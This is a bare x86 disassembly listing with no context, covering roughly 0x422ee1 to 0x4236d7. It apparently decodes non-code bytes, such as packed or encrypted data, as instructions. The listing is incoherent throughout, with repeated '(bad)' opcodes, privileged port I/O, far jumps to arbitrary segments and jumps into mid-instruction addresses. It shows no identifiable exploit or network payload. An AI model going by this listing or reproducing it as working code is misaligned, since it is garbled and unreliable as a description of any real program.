  422ee1:	adc    eax,DWORD PTR [esi-0x13]
  422ee4:	test   al,0xea
  422ee6:	das    
  422ee7:	xchg   DWORD PTR [esi-0x54],edx
  422eea:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422eeb:	aad    0xf9
  422eed:	dec    esi
  422eee:	inc    esp
  422eef:	ret    0xda3f
  422ef2:	test   DWORD PTR [edx-0x698ef7e1],esi
  422ef8:	mov    ebp,DWORD PTR [ebp-0x7af917fb]
  422efe:	inc    ebp
  422eff:	add    BYTE PTR [ebx-0x70dccb7f],ah
  422f05:	mov    ch,0xa6
  422f07:	or     al,0x67
  422f09:	mov    dl,0xcb
  422f0b:	add    DWORD PTR [ebp-0x5d],edx
  422f0e:	int    0x8a
  422f10:	in     eax,dx
  422f11:	mov    al,ds:0xc95d321b
  422f16:	sub    edx,DWORD PTR [eax-0x97de5db]
  422f1c:	cmp    ch,cl
  422f1e:	rcr    DWORD PTR [ebp+0x2e],cl
  422f21:	pop    eax
  422f22:	xor    ebp,0xfffffffe
  422f25:	add    al,0xac
  422f27:	xchg   esp,eax
  422f28:	mov    edx,0x5b7808d2
  422f2d:	mov    al,0xe7
  422f2f:	pusha  
  422f30:	pcmpgtd mm5,QWORD PTR [edx+0x3f]
  422f34:	popf   
  422f35:	(bad)  
  422f36:	clc    
  422f37:	mov    esi,0x32d44677
  422f3c:	mov    esi,DWORD PTR [eax]
  422f3e:	pop    esp
  422f3f:	fs enter 0xed7a,0x79
  422f44:	or     esp,DWORD PTR [esi+0x7e6e7f3e]
  422f4a:	(bad)  
  422f4b:	jle    0x422ed1
  422f4d:	xchg   BYTE PTR [esi],dl
  422f4f:	jo     0x422fab
  422f51:	mov    eax,ebp
  422f53:	lods   eax,DWORD PTR ds:[esi]
  422f54:	or     esp,ecx
  422f56:	xchg   DWORD PTR [edi-0x11],ebx
  422f59:	ret    
  422f5a:	addr16 out 0xe1,eax
  422f5d:	and    eax,0x3ffb5a69
  422f62:	mov    bl,0x2c
  422f64:	pop    eax
  422f65:	sub    BYTE PTR [esi-0x6bc3cb73],ch
  422f6b:	js     0x422fa2
  422f6d:	sub    ah,BYTE PTR [ecx+ebp*1]
  422f70:	pushf  
  422f71:	daa    
  422f72:	retf   0x19d2
  422f75:	fnstsw WORD PTR [esi+0x6e]
  422f78:	jo     0x422fba
  422f7a:	xchg   ebp,eax
  422f7b:	jae    0x422f80
  422f7d:	hlt    
  422f7e:	call   0x2759:0x3bfc0383
  422f85:	pop    esp
  422f86:	pop    ss
  422f87:	test   ch,bl
  422f89:	popf   
  422f8a:	sar    ebp,0xb8
  422f8d:	test   BYTE PTR [esp+ecx*2+0x3833653f],cl
  422f94:	cmp    BYTE PTR [esi+eiz*8-0x4d],al
  422f98:	stos   BYTE PTR es:[edi],al
  422f99:	popa   
  422f9a:	je     0x422f9e
  422f9c:	push   ebp
  422f9d:	jl     0x422fc0
  422f9f:	mov    dh,0xc5
  422fa1:	je     0x422fd2
  422fa3:	ret    
  422fa4:	lahf   
  422fa5:	gs leave 
  422fa7:	mov    esi,0xc7e7663c
  422fac:	cmp    al,0xfa
  422fae:	fsub   st(5),st
  422fb0:	adc    ecx,DWORD PTR [ebx-0x7fe21c78]
  422fb6:	cmp    dl,BYTE PTR [edx+0x4a5f635d]
  422fbc:	xchg   ecx,eax
  422fbd:	out    dx,al
  422fbe:	out    dx,al
  422fbf:	stc    
  422fc0:	imul   ebx,DWORD PTR [edi-0x1c],0x2c
  422fc4:	int    0xab
  422fc6:	add    esi,ecx
  422fc8:	ror    BYTE PTR [esi],1
  422fca:	iret   
  422fcb:	js     0x422fa8
  422fcd:	pop    esi
  422fce:	pop    es
  422fcf:	dec    ecx
  422fd0:	fld    st(3)
  422fd2:	in     al,dx
  422fd3:	jae    0x423037
  422fd5:	test   BYTE PTR [ebx-0x2c],dl
  422fd8:	mov    ds:0xe5cf5b60,eax
  422fdd:	inc    eax
  422fde:	mov    eax,ds:0xe4ae1868
  422fe3:	cmc    
  422fe4:	jg     0x422f73
  422fe6:	scas   eax,DWORD PTR es:[edi]
  422fe7:	mov    ch,0x15
  422fea:	mov    bh,0x8b
  422fec:	ret    
  422fed:	pushf  
  422fee:	je     0x422f7e
  422ff0:	jno    0x422ff2
  422ff2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422ff3:	jmp    FWORD PTR [ebp+0x3c2f1491]
  422ff9:	sti    
  422ffa:	in     eax,dx
  422ffb:	mov    fs,WORD PTR [edx-0x42]
  422ffe:	(bad)  
  423000:	fnstsw WORD PTR [eax-0xd047a2d]
  423006:	ja     0x422ff1
  423008:	xor    al,0x3
  42300a:	jge    0x42301c
  42300c:	mov    fs,WORD PTR [esi-0x4c41d27d]
  423012:	gs ja  0x423065
  423015:	cmc    
  423016:	mov    edi,0x39437d1b
  42301b:	jne    0x422fdb
  42301d:	pop    edx
  42301e:	inc    ecx
  42301f:	ja     0x422ffa
  423021:	sub    DWORD PTR [esi+0x659f3871],ebp
  423027:	pop    ecx
  423028:	(bad)  
  423029:	imul   ecx
  42302b:	inc    ecx
  42302c:	xor    eax,0x79c9bfc3
  423031:	push   DWORD PTR [ebx-0xd0476ce]
  423037:	(bad)  
  423038:	sub    ebx,DWORD PTR [edi+0x2e]
  42303b:	adc    DWORD PTR [edi-0x66],edi
  42303e:	cmp    ebx,DWORD PTR [ebx-0x55]
  423041:	mov    ebp,0xc7adc5eb
  423046:	cmc    
  423047:	sbb    eax,0xc820848
  42304c:	(bad)  
  42304d:	icebp  
  42304e:	test   BYTE PTR [esi],dh
  423050:	add    ch,dh
  423052:	shl    ebp,cl
  423054:	hlt    
  423055:	add    dl,BYTE PTR [esi]
  423057:	adc    al,0x70
  423059:	pushaw 
  42305b:	(bad)  
  42305c:	das    
  42305d:	cmc    
  42305e:	push   edi
  42305f:	in     ax,0x21
  423062:	adc    esp,eax
  423064:	hlt    
  423065:	fwait
  423066:	pusha  
  423067:	mov    al,0x55
  423069:	and    BYTE PTR [ebx+0x1b3d6dbb],bl
  42306f:	sbb    eax,0x424f9ef7
  423074:	jl     0x4230c3
  423076:	jmp    0x48b2:0xead9cf61
  42307d:	adc    eax,0x6894206a
  423082:	retf   
  423083:	dec    esp
  423084:	inc    ebx
  423085:	mov    dh,0x16
  423087:	jbe    0x4230ec
  423089:	cmp    bh,0x7a
  42308c:	stos   DWORD PTR es:[edi],eax
  42308d:	jno    0x423057
  42308f:	sub    BYTE PTR [ebx-0x6a],cl
  423092:	dec    edx
  423093:	sub    cl,BYTE PTR [edx-0x3399d28b]
  423099:	pop    esp
  42309a:	repnz mov cl,0x26
  42309d:	sub    BYTE PTR [ecx+0x7ead067],dl
  4230a3:	jecxz  0x4230d8
  4230a5:	test   al,0xbb
  4230a7:	jmp    0x4230c9
  4230a9:	sub    dh,BYTE PTR [eax-0x40]
  4230ac:	fstp   st(0)
  4230ae:	mov    bh,BYTE PTR [ecx]
  4230b0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4230b1:	push   eax
  4230b2:	fcom   st(0)
  4230b4:	fld    TBYTE PTR [ecx-0x6f]
  4230b7:	mul    BYTE PTR [esi+edx*2-0x7f]
  4230bb:	inc    esi
  4230bc:	and    DWORD PTR [ebx-0x78],0x45
  4230c0:	dec    ebp
  4230c1:	push   ebx
  4230c2:	mov    ah,dh
  4230c4:	cmp    al,0xd0
  4230c6:	jg     0x4230c0
  4230c8:	sbb    eax,0x9043465c
  4230cd:	and    al,0x16
  4230cf:	shl    BYTE PTR [ebx],1
  4230d1:	out    0x89,eax
  4230d3:	jne    0x423109
  4230d5:	xchg   esi,eax
  4230d6:	repnz push edx
  4230d8:	jle    0x423112
  4230da:	jle    0x4230e1
  4230dc:	aad    0x17
  4230de:	push   0xfffffff0
  4230e0:	cmp    bl,dh
  4230e2:	nop
  4230e3:	cmp    eax,DWORD PTR [eax-0x7]
  4230e6:	data16 mov al,ds:0x21a05fa9
  4230ec:	fwait
  4230ed:	xchg   ebx,eax
  4230ee:	inc    esi
  4230ef:	mov    ecx,0xb0b46610
  4230f4:	retf   0xd040
  4230f7:	popa   
  4230f8:	retf   0xbd81
  4230fb:	push   0xffffffd7
  4230fd:	mov    dh,0x40
  4230ff:	mov    edi,0xbb35c30e
  423104:	in     al,0xbe
  423106:	sbb    eax,0x1b11399d
  42310b:	cdq    
  42310c:	stc    
  42310d:	sub    ecx,edx
  42310f:	mov    fs,edx
  423111:	stos   DWORD PTR es:[edi],eax
  423112:	xchg   ebp,eax
  423113:	(bad)  
  423115:	dec    ecx
  423116:	cmp    edx,esp
  423118:	jns    0x423123
  42311a:	fstp   QWORD PTR [eax]
  42311c:	cmp    ch,BYTE PTR [edx+edx*1-0x39]
  423120:	sub    DWORD PTR [eax+0x6d52e98a],ebp
  423126:	push   ss
  423127:	enter  0x71b4,0x2f
  42312b:	js     0x42316d
  42312d:	(bad)
  423130:	add    al,0xb5
  423132:	sub    BYTE PTR [ecx],0x24
  423135:	xchg   esp,eax
  423136:	and    al,0x29
  423138:	shl    DWORD PTR ds:0x572987a0,0x7f
  42313f:	arpl   WORD PTR [edx-0x40],cx
  423142:	xchg   edx,eax
  423143:	mov    esi,DWORD PTR [edi]
  423145:	(bad)  
  423147:	pop    ds
  423148:	pop    eax
  423149:	adc    DWORD PTR [edi],esp
  42314b:	jecxz  0x42310a
  42314d:	adc    BYTE PTR [eax+0x71],bl
  423150:	xor    eax,0xae379286
  423155:	loop   0x42315b
  423157:	mov    bh,BYTE PTR [ecx]
  423159:	add    eax,0x79ac1607
  42315e:	jne    0x4231df
  423160:	push   ds
  423161:	push   edi
  423162:	mov    al,0xf1
  423164:	sub    al,0xba
  423166:	sbb    eax,0xa55e3cc1
  42316b:	xchg   DWORD PTR [eax],eax
  42316d:	gs cli 
  42316f:	imul   edi,DWORD PTR [ebx],0xa07f6ee3
  423175:	pop    esp
  423176:	daa    
  423177:	mov    ebp,0xca6229d2
  42317c:	repz push es
  42317e:	push   esp
  42317f:	mov    ds:0x73c8aa60,eax
  423184:	pop    es
  423185:	mov    edx,0x39abc4f2
  42318a:	icebp  
  42318b:	int3   
  42318c:	aam    0xd
  42318e:	push   eax
  42318f:	loop   0x4231ef
  423191:	mov    esi,0x8b5833e
  423196:	jl     0x4231f6
  423198:	cmp    dl,BYTE PTR [eax+ebx*2+0x2d805761]
  42319f:	ins    DWORD PTR es:[edi],dx
  4231a0:	jmp    0x978894fd
  4231a5:	adc    ch,BYTE PTR [edi-0x24]
  4231a8:	mov    cs,WORD PTR [ecx+0x65]
  4231ab:	xor    dh,ch
  4231ad:	pop    ss
  4231ae:	mov    WORD PTR [esi],fs
  4231b0:	das    
  4231b1:	sub    DWORD PTR [edx+0x3977deb2],ebx
  4231b7:	(bad)  
  4231b8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4231b9:	icebp  
  4231ba:	mov    edx,DWORD PTR [ebx+0x3264da7d]
  4231c0:	mov    edi,0x30832a49
  4231c5:	xor    BYTE PTR [esi],dh
  4231c7:	xchg   ebp,eax
  4231c8:	scas   al,BYTE PTR es:[edi]
  4231c9:	cld    
  4231ca:	jae    0x423151
  4231cc:	lea    edx,[eax]
  4231ce:	jle    0x4231e4
  4231d0:	enter  0xd935,0x25
  4231d4:	mov    eax,0x2b6d6867
  4231d9:	int3   
  4231da:	(bad)  
  4231db:	mov    edx,0xc128f379
  4231e0:	xchg   DWORD PTR [edi-0x80],eax
  4231e3:	out    dx,al
  4231e4:	push   ss
  4231e5:	pusha  
  4231e6:	icebp  
  4231e7:	push   esi
  4231e8:	lods   eax,DWORD PTR ds:[esi]
  4231e9:	pop    ebx
  4231ea:	pop    ss
  4231eb:	iret   
  4231ec:	fsub   QWORD PTR ds:0xb0f71eb5
  4231f2:	mov    ss,WORD PTR [esi+0x17feec24]
  4231f8:	jecxz  0x423195
  4231fa:	sbb    edi,DWORD PTR [esi+0x5e854206]
  423200:	and    al,0xf8
  423202:	or     eax,0x1ee45980
  423207:	std    
  423208:	shl    BYTE PTR [ebp-0x15fcefe2],0x62
  42320f:	xchg   edi,eax
  423210:	ret    0xe497
  423213:	out    0x79,eax
  423215:	or     eax,0x62c487e0
  42321a:	out    dx,al
  42321b:	enter  0x9361,0x34
  42321f:	leave  
  423220:	les    edx,FWORD PTR [edi]
  423222:	out    dx,eax
  423223:	mov    ecx,DWORD PTR [ecx]
  423225:	xor    edi,DWORD PTR [edx-0x55bb7172]
  42322b:	pop    ecx
  42322c:	loope  0x4231f4
  42322e:	cmp    esi,edi
  423230:	sub    BYTE PTR [esi],0x38
  423233:	sub    BYTE PTR [edx],0x61
  423236:	pop    edi
  423237:	xor    ecx,0x7b
  42323a:	aas    
  42323b:	dec    ebx
  42323c:	aad    0xe5
  42323e:	clc    
  42323f:	mov    esi,0x9534b03a
  423244:	ret    0x7603
  423247:	dec    ebx
  423248:	ds hlt 
  42324a:	mov    ds:0x8a7d3da7,eax
  42324f:	lahf   
  423250:	jmp    0xf578c734
  423255:	cmc    
  423256:	gs aas 
  423258:	out    0xf3,eax
  42325a:	rol    DWORD PTR [edi],0x81
  42325d:	inc    esi
  42325e:	inc    ebx
  42325f:	or     BYTE PTR [ebp+0x57],dh
  423262:	daa    
  423263:	out    0xb9,eax
  423265:	pop    esi
  423266:	call   0xccc52e67
  42326b:	in     al,dx
  42326c:	xor    ch,dl
  42326e:	sbb    eax,0x6325baf6
  423273:	fs mov dh,0x73
  423276:	stos   DWORD PTR es:[edi],eax
  423277:	out    dx,al
  423278:	mov    ch,0x90
  42327a:	sub    ebx,DWORD PTR [esi]
  42327c:	sub    eax,0x59a87518
  423281:	adc    DWORD PTR [edi-0x41],ebx
  423284:	ret    0xb828
  423287:	push   esp
  423288:	sbb    edi,edi
  42328a:	sbb    cl,ch
  42328c:	fs and al,0xef
  42328f:	int    0x31
  423291:	daa    
  423292:	int    0x75
  423294:	aam    0x97
  423296:	ret    0x1ef2
  423299:	push   0x5114cb5c
  42329e:	dec    edi
  42329f:	lahf   
  4232a0:	push   ebx
  4232a1:	xchg   DWORD PTR [edx-0x5b4bb416],edi
  4232a7:	out    0x8b,eax
  4232a9:	shl    DWORD PTR [edx+eiz*1-0x75ce4aa3],cl
  4232b0:	sub    DWORD PTR [edi],0x5ec27fca
  4232b6:	push   ds
  4232b7:	mov    dl,BYTE PTR [ebp-0x46]
  4232ba:	xchg   ch,dh
  4232bc:	stos   DWORD PTR es:[edi],eax
  4232bd:	retf   
  4232be:	and    dl,BYTE PTR [ebp+0x10a2e976]
  4232c4:	xchg   ecx,eax
  4232c5:	scas   al,BYTE PTR es:[edi]
  4232c6:	lea    edi,ds:0x5eadb03c
  4232cc:	scas   eax,DWORD PTR es:[edi]
  4232cd:	inc    ebp
  4232ce:	cld    
  4232cf:	ins    BYTE PTR es:[edi],dx
  4232d0:	iret   
  4232d1:	xor    eax,0xb9e295a
  4232d6:	in     al,dx
  4232d7:	in     eax,0x23
  4232d9:	push   ds
  4232da:	mov    eax,ds:0xc5c8eb56
  4232df:	cs aad 0x4d
  4232e2:	add    al,0xc2
  4232e4:	inc    edi
  4232e5:	add    eax,0x7579653d
  4232ea:	sub    BYTE PTR [eax+ebp*1],0x4e
  4232ee:	cdq    
  4232ef:	mov    ah,0x5d
  4232f1:	push   edx
  4232f2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4232f3:	data16 ins BYTE PTR es:[edi],dx
  4232f5:	call   0x775f:0x3a88ae01
  4232fc:	cwde   
  4232fd:	mov    DWORD PTR [edi+0x5ef3eb18],ebx
  423303:	dec    ecx
  423304:	sub    ecx,DWORD PTR [edi-0x4b10ad13]
  42330a:	mov    ebp,DWORD PTR [ebx+0x4d]
  42330d:	daa    
  42330e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42330f:	inc    ebp
  423310:	pushf  
  423311:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  423312:	mov    ebp,0x1fa19b69
  423317:	retf   
  423318:	shl    BYTE PTR [ecx+0x7],cl
  42331b:	lods   eax,DWORD PTR fs:[esi]
  42331d:	pop    es
  42331e:	lahf   
  42331f:	mov    esi,0xebbe97c2
  423324:	shl    BYTE PTR [ebp-0x2b],0x4b
  423328:	pusha  
  423329:	push   ebx
  42332a:	adc    eax,0x862058d4
  42332f:	pushf  
  423330:	imul   eax,DWORD PTR [esi-0x73],0xffffffd5
  423334:	repnz mov eax,ds:0x5e061e4b
  42333a:	dec    ecx
  42333b:	pop    edx
  42333c:	lahf   
  42333d:	and    BYTE PTR [ebp-0x5],0x4
  423341:	lock mov eax,0x5b219e98
  423347:	xor    BYTE PTR [esp+eax*8],0xcd
  42334b:	out    0x19,al
  42334d:	fcomi  st,st(1)
  42334f:	sub    al,0xa7
  423351:	cmp    eax,DWORD PTR [esi]
  423353:	test   DWORD PTR [esi-0x3b0c5c67],edi
  423359:	cwde   
  42335a:	ret    0xdd10
  42335d:	push   edx
  42335e:	mov    DWORD PTR [ebx],0x984d5e4b
  423364:	xchg   ebp,eax
  423365:	lds    edx,FWORD PTR [eax+esi*2]
  423368:	cmp    eax,0xa329784
  42336d:	arpl   WORD PTR [ebp+ebp*2+0xd],ax
  423371:	xor    BYTE PTR gs:[esi],bl
  423374:	mov    ah,0x27
  423376:	adc    DWORD PTR [ebp+0x19f4b9ab],ecx
  42337c:	lods   eax,DWORD PTR ds:[esi]
  42337d:	sub    DWORD PTR [ebp+0x35],edx
  423380:	adc    eax,0x5b971a31
  423385:	das    
  423386:	ja     0x4233c1
  423388:	lock jnp 0x4233a1
  42338b:	jmp    0x9bdb:0x37d1c7a0
  423392:	retf   
  423393:	mov    ds:0x95bb08a5,al
  423398:	iret   
  423399:	cmp    al,0x2a
  42339b:	mov    esp,0x3aaa85a9
  4233a0:	push   ebx
  4233a1:	aaa    
  4233a2:	fstp   st(0)
  4233a4:	inc    ebp
  4233a5:	mov    edx,0xbeae9b13
  4233aa:	sbb    al,BYTE PTR [eax+0xd980c18]
  4233b0:	inc    edi
  4233b1:	mov    al,ds:0x41d1f4ed
  4233b6:	push   edi
  4233b7:	xor    ebx,eax
  4233b9:	test   ah,dl
  4233bb:	mov    ch,0x15
  4233bd:	jne    0x42340a
  4233bf:	or     edi,DWORD PTR [esi]
  4233c1:	test   DWORD PTR ds:0x4fb166ac,ecx
  4233c7:	mov    cl,0xfc
  4233c9:	xlat   BYTE PTR ds:[ebx]
  4233ca:	mov    dl,0x67
  4233cc:	es in  eax,0xa9
  4233cf:	jle    0x4233ca
  4233d1:	xor    ah,BYTE PTR [ecx+ebx*2+0x12c4b060]
  4233d8:	mov    bh,0x54
  4233da:	and    bl,dl
  4233dc:	sbb    edi,DWORD PTR [edi]
  4233de:	jns    0x423365
  4233e0:	in     al,dx
  4233e1:	sub    ch,bh
  4233e3:	xor    ah,BYTE PTR [ecx+eax*8-0xeafdc4a]
  4233ea:	leave  
  4233eb:	shl    BYTE PTR [esi],1
  4233ed:	mov    esp,0x749b367b
  4233f2:	cli    
  4233f3:	sbb    al,0x2b
  4233f5:	push   0x2b
  4233f7:	mov    esi,0xe7d08ece
  4233fc:	pop    es
  4233fd:	push   esp
  4233fe:	test   DWORD PTR [edx],eax
  423400:	sbb    eax,0x1ad07888
  423405:	mov    bh,0x5
  423407:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  423408:	mov    ds:0x5b3b46eb,eax
  42340d:	aam    0x1b
  42340f:	jno    0x423405
  423411:	stos   DWORD PTR es:[edi],eax
  423412:	daa    
  423413:	out    dx,al
  423414:	push   cs
  423415:	sub    DWORD PTR [ebx],0x9b915ba3
  42341b:	call   0xe834:0xf2defc0a
  423422:	loopne 0x4233ad
  423424:	pop    ds
  423425:	and    DWORD PTR [ebx],ebx
  423427:	jp     0x423414
  423429:	adc    BYTE PTR [esi],0xdc
  42342c:	aas    
  42342d:	clc    
  42342e:	mov    dh,0x83
  423430:	inc    eax
  423431:	adc    eax,0x6475d5a6
  423436:	cli    
  423437:	and    al,0xa5
  423439:	pusha  
  42343a:	jb     0x423425
  42343c:	ret    0x3ed9
  42343f:	(bad)  
  423440:	jecxz  0x42349d
  423442:	add    bl,BYTE PTR [eax]
  423444:	pop    edx
  423445:	mov    ebp,0x814d3766
  42344a:	cmp    BYTE PTR [ebp-0x3b131fe8],ah
  423450:	mov    cs,WORD PTR [edi-0x13868f7b]
  423456:	mov    ds:0xf8ab68aa,eax
  42345b:	in     al,0xba
  42345d:	mov    gs,WORD PTR [ecx-0x2f]
  423460:	and    DWORD PTR [edi-0x3feb7f86],edi
  423466:	out    dx,al
  423467:	ins    BYTE PTR es:[edi],dx
  423468:	mov    DWORD PTR [edx+eax*2-0x2],edi
  42346c:	cmp    BYTE PTR es:[edi],bl
  42346f:	push   edx
  423471:	or     ebx,esp
  423473:	xchg   ebx,eax
  423474:	mov    esi,0xb41f333f
  423479:	div    DWORD PTR [ecx+0x1c8c463c]
  42347f:	jne    0x4234e7
  423481:	xchg   BYTE PTR [ebx-0x75dbf147],ch
  423487:	inc    ebx
  423488:	inc    edx
  423489:	out    0xf7,al
  42348b:	adc    edx,ebp
  42348d:	fwait
  42348e:	aad    0xe3
  423490:	out    0x23,al
  423492:	xchg   ecx,eax
  423493:	push   edx
  423494:	mov    cl,0x79
  423496:	add    al,0x96
  423498:	outs   dx,BYTE PTR ds:[esi]
  423499:	xor    BYTE PTR [eax],0xaf
  42349c:	rcr    esp,1
  42349e:	not    BYTE PTR [esp+edi*1+0x6a0b875d]
  4234a5:	nop
  4234a6:	dec    esi
  4234a7:	scas   al,BYTE PTR es:[edi]
  4234a8:	pushf  
  4234a9:	xchg   esi,eax
  4234aa:	mov    ds:0x24d8f999,al
  4234af:	retf   
  4234b0:	aas    
  4234b1:	addr16 shl edx,1
  4234b4:	inc    ecx
  4234b5:	mov    edi,0x9f8fe112
  4234ba:	push   es
  4234bb:	fstp   QWORD PTR ds:0xcacb2bed
  4234c1:	jmp    0xf66b:0x41533a56
  4234c8:	es sbb eax,0x13c7c1f8
  4234ce:	adc    dh,BYTE PTR [edx+0x487b0ac4]
  4234d4:	aam    0x27
  4234d6:	pop    esi
  4234d7:	jge    0x4234d7
  4234d9:	push   es
  4234da:	(bad)  
  4234db:	bound  esp,QWORD PTR [eax]
  4234dd:	movd   DWORD PTR [edi-0x6f038b96],mm6
  4234e4:	and    ecx,edx
  4234e6:	or     ah,BYTE PTR [edi-0x9]
  4234e9:	and    BYTE PTR [edi-0xe1b770f],ah
  4234ef:	popa   
  4234f0:	sbb    esp,ecx
  4234f2:	ret    0x641
  4234f5:	inc    edi
  4234f6:	loopne 0x4234c7
  4234f8:	cmc    
  4234f9:	pop    ss
  4234fa:	dec    ebp
  4234fb:	iret   
  4234fc:	mov    edx,0x871760dd
  423501:	sub    BYTE PTR [ebx+0x4e],ah
  423504:	inc    ebx
  423505:	and    ebx,DWORD PTR [edi+0x20]
  423508:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  423509:	test   BYTE PTR [ebp+0x5c],0x22
  42350d:	clc    
  42350e:	aaa    
  42350f:	add    al,0x2
  423511:	inc    edi
  423512:	jmp    0x42349b
  423514:	test   DWORD PTR [eax],eax
  423516:	mov    eax,0xb07ccdde
  42351b:	mov    ebx,0xf860a646
  423520:	lea    ecx,ds:0xfe60da01
  423526:	xchg   ebp,eax
  423527:	pop    edx
  423528:	(bad)  
  423529:	leave  
  42352a:	cmovae eax,DWORD PTR [ecx]
  42352d:	mov    ebp,0xff3394b
  423532:	add    BYTE PTR [eax-0x1b],dl
  423535:	mov    dh,0x38
  423537:	xchg   ebp,eax
  423538:	xor    eax,0xba3bfbc4
  42353d:	dec    eax
  42353e:	mov    WORD PTR [esi+0x3b1804ea],?
  423544:	push   es
  423545:	cmp    eax,0xffffffba
  423548:	sub    al,0xc7
  42354b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42354c:	mov    esi,DWORD PTR [ecx+0xd]
  42354f:	inc    edx
  423550:	inc    ebx
  423551:	push   es
  423552:	loope  0x4234f6
  423554:	xchg   edx,eax
  423555:	jo     0x4235ae
  423557:	mov    ebx,0xd31d0a7d
  42355c:	jne    0x42350e
  42355e:	out    dx,al
  42355f:	push   ebx
  423560:	aad    0x1f
  423562:	push   ebp
  423563:	mov    WORD PTR [ebp+0x24],gs
  423566:	adc    DWORD PTR [edx+esi*8],eax
  423569:	cwde   
  42356a:	mov    dh,0x93
  42356c:	pushf  
  42356d:	daa    
  42356e:	pop    esi
  42356f:	je     0x42358d
  423571:	xchg   BYTE PTR [eax+0x40105666],dh
  423577:	and    eax,0x7405f38b
  42357c:	dec    ecx
  42357d:	hlt    
  42357e:	xchg   esp,eax
  42357f:	neg    DWORD PTR [ecx+ebp*8]
  423582:	imul   ebp,DWORD PTR [esi+0x47a5dfca],0x72a32d9e
  42358c:	xchg   esp,eax
  42358d:	pop    ecx
  42358e:	neg    BYTE PTR [edx]
  423590:	mov    ds:0x83a278f3,eax
  423595:	aaa    
  423596:	push   eax
  423597:	ret    0x4b1e
  42359a:	sahf   
  42359b:	mov    ss,WORD PTR [ebx+0x6cb5ce84]
  4235a1:	mov    cl,0xd8
  4235a3:	sbb    edi,ebx
  4235a5:	adc    dl,BYTE PTR [esp+ebx*2-0x24192319]
  4235ac:	push   edx
  4235ad:	(bad)  
  4235ae:	aad    0x8b
  4235b0:	lds    edx,FWORD PTR [edx+0x72]
  4235b3:	fidiv  WORD PTR [edi+0x3e606b26]
  4235b9:	push   0xad438437
  4235be:	jo     0x4235f0
  4235c0:	xchg   ecx,eax
  4235c1:	jg     0x4235f2
  4235c3:	mov    dh,0xaa
  4235c5:	bswap  eax
  4235c7:	stc    
  4235c8:	mov    dh,0xdb
  4235ca:	loope  0x4235c8
  4235cc:	loope  0x423585
  4235ce:	mov    edx,0x9643d578
  4235d3:	lahf   
  4235d4:	mov    ebp,DWORD PTR [edx+0x2c]
  4235d7:	and    ebp,DWORD PTR [edx+0x257b824a]
  4235dd:	or     al,0x2a
  4235df:	xlat   BYTE PTR ds:[ebx]
  4235e0:	loope  0x423572
  4235e2:	inc    esp
  4235e3:	sbb    eax,0xb7f45c3f
  4235e8:	test   eax,0xc25f16a1
  4235ed:	ficomp WORD PTR [esi+0x400e3a9]
  4235f3:	or     DWORD PTR [edx],ebp
  4235f5:	fmul   st,st(1)
  4235f7:	popf   
  4235f8:	rol    BYTE PTR [eax-0x2e],1
  4235fb:	jns    0x42359a
  4235fd:	sub    BYTE PTR es:[ebx+0x69],ch
  423601:	push   ecx
  423602:	call   0x18349cea
  423607:	mov    ah,0xc
  423609:	sub    eax,0x22fc5809
  42360e:	jle    0x42368e
  423610:	iret   
  423611:	jnp    0x4235a3
  423613:	xlat   BYTE PTR ds:[ebx]
  423614:	mov    ah,0xe7
  423616:	adc    eax,0xa2568aff
  42361b:	out    dx,al
  42361c:	jno    0x4235ce
  42361e:	push   0x78
  423620:	mov    bl,0x1
  423622:	jp     0x42366d
  423624:	js     0x4235c2
  423626:	dec    edi
  423627:	out    0x81,eax
  423629:	mov    edx,0xefc33120
  42362e:	ds jp  0x423616
  423631:	or     ebp,eax
  423633:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  423634:	jl     0x4235e6
  423636:	pop    esi
  423637:	inc    esp
  423638:	xchg   DWORD PTR [edx-0x20],ebp
  42363b:	sub    al,0x58
  42363d:	(bad)  
  42363e:	push   cs
  42363f:	mov    edi,0xd6d01f28
  423644:	pop    es
  423645:	pop    ds
  423646:	sub    eax,0x95f04e5b
  42364b:	and    BYTE PTR [edi-0xed1f5a4],0xb3
  423652:	arpl   WORD PTR [ecx-0x16],dx
  423655:	cmc    
  423656:	adc    al,0x97
  423658:	adc    edx,DWORD PTR es:[edx-0x70a72555]
  42365f:	jnp    0x4236c3
  423661:	pop    es
  423662:	enter  0x933c,0x7b
  423666:	ja     0x4236d7
  423668:	sbb    dl,BYTE PTR [ebx-0x2]
  42366b:	adc    al,0x60
  42366d:	iret   
  42366e:	push   esp
  42366f:	push   eax
  423670:	call   FWORD PTR [esp+ecx*1]
  423673:	nop
  423674:	sbb    al,0xf7
  423676:	hlt    
  423677:	out    0x55,al
  423679:	mov    edx,edi
  42367b:	ret    0xc7e5
  42367e:	mov    esi,0x14fab93a
  423683:	sti    
  423684:	cmp    esp,DWORD PTR [edx+0x51e8eb99]
  42368a:	xchg   esi,eax
  42368b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42368c:	jno    0x423656
  42368e:	(bad)  
  42368f:	adc    ax,0x5e2
  423693:	int    0xf3
  423695:	push   edx
  423696:	jbe    0x423665
  423698:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  423699:	inc    esp
  42369a:	loop   0x4236f0
  42369c:	mov    eax,ds:0xa03ca4e4
  4236a1:	inc    ecx
  4236a2:	cs inc edi
  4236a4:	out    0x11,eax
  4236a6:	addr16 leave 
  4236a8:	cmp    DWORD PTR ds:0x3e2293c2,edx
  4236ae:	dec    eax
  4236af:	enter  0x1ab6,0x3
  4236b3:	out    dx,al
  4236b4:	imul   ebp,DWORD PTR [eax],0x53
  4236b7:	jle    0x4236f8
  4236b9:	and    BYTE PTR [esi+esi*4-0x67364c8f],ah
  4236c0:	push   ebp
  4236c1:	adc    eax,0xdda4cd52
  4236c6:	add    al,0xd2
  4236c8:	jnp    0x42365b
  4236ca:	push   ebx
  4236cb:	xor    ah,BYTE PTR [ebx+ecx*4+0x601c8b4e]
  4236d2:	xchg   ebp,eax
  4236d3:	mov    al,0x99
  4236d5:	(bad)  
  4236d6:	push   ds
  4236d7:	mov    ds:0x64acd099,eax
